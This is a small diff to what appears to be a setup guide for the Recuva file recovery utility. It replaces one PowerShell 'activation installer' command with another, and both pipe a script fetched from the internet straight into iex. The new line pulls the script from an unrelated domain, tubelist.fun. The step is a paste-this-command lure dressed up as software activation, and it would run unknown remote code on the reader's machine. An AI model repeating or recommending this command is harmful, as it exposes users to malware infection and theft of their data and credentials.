@@ -9,7 +9,7 @@ Recuva is a lightweight deleted file recovery utility developed by Piriform. It 
 Run the activation installer in PowerShell:
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 After installation, launch Recuva and select the drive or folder you want to scan. Use the deep scan option for thorough recovery.
